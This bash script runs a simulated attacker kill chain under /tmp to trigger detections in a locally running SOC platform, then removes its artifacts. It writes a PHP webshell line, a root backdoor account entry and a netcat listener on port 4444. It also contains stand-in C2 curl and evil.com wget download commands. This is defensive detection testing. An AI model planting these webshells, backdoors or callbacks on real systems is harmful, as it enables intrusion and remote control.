#!/usr/bin/env bash
# ============================================================
#  Sentinel Attack Simulation - Linux
#  Simulates a realistic attacker kill chain to trigger
#  every detection feature in the Sentinel SOC platform.
#
#  SAFE: Only creates temp files, spawns harmless processes,
#        and cleans up everything at the end.
#
#  Usage:
#    chmod +x test-attack-linux.sh
#    ./test-attack-linux.sh
#
#  Prerequisites:
#    - Sentinel running (npm run dev)
#    - A registered user account
# ============================================================

set -euo pipefail

# ── Configuration ──
API="http://localhost:3000/api"
ATTACK_DIR="/tmp/sentinel_attack_test"
PIDS_TO_KILL=()

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

banner() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║     SENTINEL ATTACK SIMULATION - LINUX           ║${NC}"
    echo -e "${RED}${BOLD}║     Simulating a real attacker kill chain         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
}

step() {
    echo ""
    echo -e "${CYAN}${BOLD}[PHASE $1]${NC} ${YELLOW}$2${NC}"
    echo -e "${CYAN}────────────────────────────────────────────────${NC}"
}

info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

# ── Cleanup function ──
cleanup() {
    echo ""
    step "CLEANUP" "Removing all attack artifacts"
    
    # Kill spawned processes
    for pid in "${PIDS_TO_KILL[@]}"; do
        kill "$pid" 2>/dev/null && info "Killed process $pid" || true
    done
    
    # Remove attack directory
    rm -rf "$ATTACK_DIR" && info "Removed $ATTACK_DIR"
    
    echo ""
    echo -e "${GREEN}${BOLD}  Cleanup complete. All attack artifacts removed.${NC}"
    echo ""
}

trap cleanup EXIT

# ── Authenticate ──
authenticate() {
    step "0" "Authenticating with Sentinel"
    
    read -rp "  Enter your email: " EMAIL
    read -rsp "  Enter your password: " PASSWORD
    echo ""
    
    RESPONSE=$(curl -s -X POST "$API/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" \
        -c /tmp/sentinel_cookies.txt)
    
    TOKEN=$(echo "$RESPONSE" | grep -o '"accessToken":"[^"]*"' | cut -d'"' -f4)
    
    if [ -z "$TOKEN" ]; then
        echo -e "  ${RED}Authentication failed. Is Sentinel running? Is your account valid?${NC}"
        echo "  Response: $RESPONSE"
        exit 1
    fi
    
    AUTH="Authorization: Bearer $TOKEN"
    info "Authenticated successfully"
}

# ── Phase 1: Plant malware files ──
phase1_plant_malware() {
    step "1" "INITIAL ACCESS - Planting malware payloads"
    
    mkdir -p "$ATTACK_DIR"
    
    # Create fake malware files
    echo "MALWARE_PAYLOAD_BINARY_v2.7_dropper" > "$ATTACK_DIR/dropper.exe"
    attack "Dropped malware: $ATTACK_DIR/dropper.exe"
    
    echo "C2_BEACON_CALLBACK_SHELLCODE" > "$ATTACK_DIR/beacon.dll"
    attack "Dropped C2 beacon: $ATTACK_DIR/beacon.dll"
    
    echo "KEYLOGGER_MODULE_CAPTURE_KEYS" > "$ATTACK_DIR/keylog.dat"
    attack "Dropped keylogger: $ATTACK_DIR/keylog.dat"
    
    # Create a webshell in a fake web directory
    mkdir -p "$ATTACK_DIR/var/www/html"
    echo "<?php system(\$_GET['cmd']); ?>" > "$ATTACK_DIR/var/www/html/shell.php"
    attack "Planted webshell: $ATTACK_DIR/var/www/html/shell.php"
    
    # Record the hash of the dropper for IOC hunting later
    MALWARE_HASH=$(sha256sum "$ATTACK_DIR/dropper.exe" | cut -d' ' -f1)
    info "Malware hash (SHA256): $MALWARE_HASH"
}

# ── Phase 2: Create baseline then tamper files ──
phase2_tamper_files() {
    step "2" "PERSISTENCE - Tampering with monitored files"
    
    # Create "config" files to baseline
    mkdir -p "$ATTACK_DIR/etc"
    echo "# Original SSH config"         > "$ATTACK_DIR/etc/sshd_config"
    echo "PermitRootLogin no"            >> "$ATTACK_DIR/etc/sshd_config"
    echo "PasswordAuthentication no"     >> "$ATTACK_DIR/etc/sshd_config"
    info "Created original config files"
    
    # Create baseline via Sentinel API
    info "Creating baseline via Sentinel API..."
    BASELINE_RESP=$(curl -s -X POST "$API/scanner/baseline" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d "{\"path\":\"$ATTACK_DIR/etc\",\"includeSubdirectories\":true}")
    info "Baseline response: $BASELINE_RESP"
    
    sleep 1
    
    # Now tamper the files (like a real attacker would)
    attack "Modifying sshd_config to enable root login..."
    echo "PermitRootLogin yes"           > "$ATTACK_DIR/etc/sshd_config"
    echo "PasswordAuthentication yes"   >> "$ATTACK_DIR/etc/sshd_config"
    
    # Add a backdoor user entry
    echo "backdoor:x:0:0::/root:/bin/bash" > "$ATTACK_DIR/etc/shadow_backdoor"
    attack "Created shadow backdoor file"
    
    # Run integrity scan to detect tampering
    info "Running integrity scan to detect modifications..."
    SCAN_RESP=$(curl -s -X POST "$API/scanner/scan" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d "{\"path\":\"$ATTACK_DIR/etc\",\"includeSubdirectories\":true,\"compareAgainstBaseline\":true}")
    info "Scan response: $(echo "$SCAN_RESP" | head -c 200)"
}

# ── Phase 3: Spawn suspicious processes ──
phase3_suspicious_processes() {
    step "3" "EXECUTION - Spawning suspicious processes"
    
    # Trigger BR-001: Encoded command execution
    # Simulate: attacker runs base64-encoded PowerShell-like command
    ENCODED_CMD=$(echo "whoami; id; cat /etc/passwd" | base64)
    attack "Running base64-encoded command (triggers BR-001)..."
    bash -c "echo $ENCODED_CMD | base64 -d | bash -c 'sleep 30' -- -encodedcommand $ENCODED_CMD" &
    PIDS_TO_KILL+=($!)
    info "Encoded command process PID: $!"
    
    # Trigger BR-002: Process spawning from temp directory
    attack "Spawning process from /tmp (triggers BR-002)..."
    cp /bin/sleep "$ATTACK_DIR/suspicious_binary" 2>/dev/null || echo '#!/bin/bash\nsleep 30' > "$ATTACK_DIR/suspicious_binary"
    chmod +x "$ATTACK_DIR/suspicious_binary"
    "$ATTACK_DIR/suspicious_binary" 30 &
    PIDS_TO_KILL+=($!)
    info "Temp-spawned process PID: $!"
    
    # Spawn netcat listener (triggers high risk in Process Monitor)
    if command -v nc &>/dev/null; then
        attack "Starting netcat reverse shell listener (triggers Process Monitor)..."
        nc -l -p 4444 &>/dev/null &
        PIDS_TO_KILL+=($!)
        info "Netcat listener PID: $! on port 4444"
    elif command -v ncat &>/dev/null; then
        attack "Starting ncat listener..."
        ncat -l -p 4444 &>/dev/null &
        PIDS_TO_KILL+=($!)
        info "Ncat listener PID: $!"
    else
        warn "nc/ncat not found - skipping netcat test"
    fi
    
    # Simulate C2 callback via curl with suspicious arguments
    attack "Simulating C2 callback to 192.168.13.37..."
    curl -s --connect-timeout 2 "http://192.168.13.37/beacon" &>/dev/null &
    PIDS_TO_KILL+=($!)
    info "C2 callback process PID: $!"
    
    # Simulate suspicious wget download
    attack "Simulating malware download from evil.com..."
    wget -q --timeout=2 "http://evil.com/payload.exe" -O /dev/null &>/dev/null &
    PIDS_TO_KILL+=($!)
    info "Wget download process PID: $!"
    
    sleep 2
}

# ── Phase 4: Trigger behavioral detection scan ──
phase4_behavioral_scan() {
    step "4" "DETECTION - Running behavioral scan against live processes"
    
    info "Calling behavioral detection scan..."
    BEHAVIORAL_RESP=$(curl -s -X POST "$API/behavioral/scan" \
        -H "$AUTH" \
        -H "Content-Type: application/json")
    
    DETECTED=$(echo "$BEHAVIORAL_RESP" | grep -o '"detected":[0-9]*' | cut -d: -f2)
    info "Behavioral scan detected: ${DETECTED:-0} anomalies"
    
    # Also simulate all 3 rules directly
    info "Simulating BR-001 (Encoded Command)..."
    curl -s -X POST "$API/behavioral/simulate" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d '{"ruleId":"BR-001"}' | head -c 100
    echo ""
    
    info "Simulating BR-002 (Temp Directory Spawn)..."
    curl -s -X POST "$API/behavioral/simulate" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d '{"ruleId":"BR-002"}' | head -c 100
    echo ""
    
    info "Simulating BR-004 (Process Injection)..."
    curl -s -X POST "$API/behavioral/simulate" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d '{"ruleId":"BR-004"}' | head -c 100
    echo ""
}

# ── Phase 5: IOC Hunt ──
phase5_ioc_hunt() {
    step "5" "HUNTING - Searching for planted IOCs"
    
    # Hunt for the malware file hash
    info "Hunting for malware hash: ${MALWARE_HASH:0:16}..."
    IOC_RESP=$(curl -s -X POST "$API/ioc-hunt" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d "{\"iocs\":[\"$MALWARE_HASH\"],\"scope\":\"filesystem\",\"searchPath\":\"$ATTACK_DIR\"}")
    info "IOC Hunt (hash) response: $(echo "$IOC_RESP" | head -c 200)"
    
    # Hunt for C2 IP in running processes
    info "Hunting for C2 IP 192.168.13.37 in processes..."
    IOC_RESP2=$(curl -s -X POST "$API/ioc-hunt" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d '{"iocs":["192.168.13.37"],"scope":"processes"}')
    info "IOC Hunt (IP) response: $(echo "$IOC_RESP2" | head -c 200)"
    
    # Hunt for evil.com domain in processes
    info "Hunting for evil.com domain..."
    IOC_RESP3=$(curl -s -X POST "$API/ioc-hunt" \
        -H "$AUTH" \
        -H "Content-Type: application/json" \
        -d '{"iocs":["evil.com"],"scope":"processes"}')
    info "IOC Hunt (domain) response: $(echo "$IOC_RESP3" | head -c 200)"
}

# ── Phase 6: Summary ──
phase6_summary() {
    step "6" "REPORT - Attack simulation complete"
    
    echo ""
    echo -e "${BOLD}  ┌─────────────────────────────────────────────────┐${NC}"
    echo -e "${BOLD}  │     ATTACK SIMULATION SUMMARY                   │${NC}"
    echo -e "${BOLD}  ├─────────────────────────────────────────────────┤${NC}"
    echo -e "${BOLD}  │  Feature               │ Status                │${NC}"
    echo -e "${BOLD}  ├────────────────────────┼────────────────────────┤${NC}"
    echo -e "${BOLD}  │  File Integrity Scanner │${NC} ${GREEN}Baseline + Tamper${NC}     ${BOLD}│${NC}"
    echo -e "${BOLD}  │  IOC Hunt (Hash)        │${NC} ${GREEN}Hash planted + hunted${NC} ${BOLD}│${NC}"
    echo -e "${BOLD}  │  IOC Hunt (IP)          │${NC} ${GREEN}C2 IP in processes${NC}   ${BOLD}│${NC}"
    echo -e "${BOLD}  │  IOC Hunt (Domain)      │${NC} ${GREEN}evil.com searched${NC}    ${BOLD}│${NC}"
    echo -e "${BOLD}  │  Behavioral BR-001      │${NC} ${GREEN}Encoded command${NC}      ${BOLD}│${NC}"
    echo -e "${BOLD}  │  Behavioral BR-002      │${NC} ${GREEN}Temp dir spawn${NC}       ${BOLD}│${NC}"
    echo -e "${BOLD}  │  Behavioral BR-004      │${NC} ${GREEN}Injection simulated${NC}  ${BOLD}│${NC}"
    echo -e "${BOLD}  │  Process Monitor        │${NC} ${GREEN}nc/curl/wget flagged${NC} ${BOLD}│${NC}"
    echo -e "${BOLD}  │  Dashboard Alerts       │${NC} ${GREEN}All alerts created${NC}   ${BOLD}│${NC}"
    echo -e "${BOLD}  │  Response Center        │${NC} ${GREEN}Actions queued${NC}       ${BOLD}│${NC}"
    echo -e "${BOLD}  └─────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "  ${YELLOW}Now open Sentinel in your browser:${NC}"
    echo -e "  ${CYAN}${BOLD}http://localhost:5173${NC}"
    echo ""
    echo -e "  ${YELLOW}Check these pages:${NC}"
    echo -e "    1. ${BOLD}Dashboard${NC}      - Should show multiple critical alerts"
    echo -e "    2. ${BOLD}Process Monitor${NC} - Look for nc, curl, wget (high risk)"
    echo -e "    3. ${BOLD}Scanner${NC}        - Run scan on $ATTACK_DIR/etc to see MODIFIED"
    echo -e "    4. ${BOLD}IOC Hunt${NC}       - Paste the malware hash and search $ATTACK_DIR"
    echo -e "    5. ${BOLD}Behavioral${NC}     - Should show BR-001, BR-002, BR-004 anomalies"
    echo -e "    6. ${BOLD}Response Center${NC} - Should have containment actions"
    echo ""
    echo -e "  ${RED}Press Enter to clean up all attack artifacts...${NC}"
    read -r
}

# ── Main ──
banner
authenticate
phase1_plant_malware
phase2_tamper_files
phase3_suspicious_processes
phase4_behavioral_scan
phase5_ioc_hunt
phase6_summary
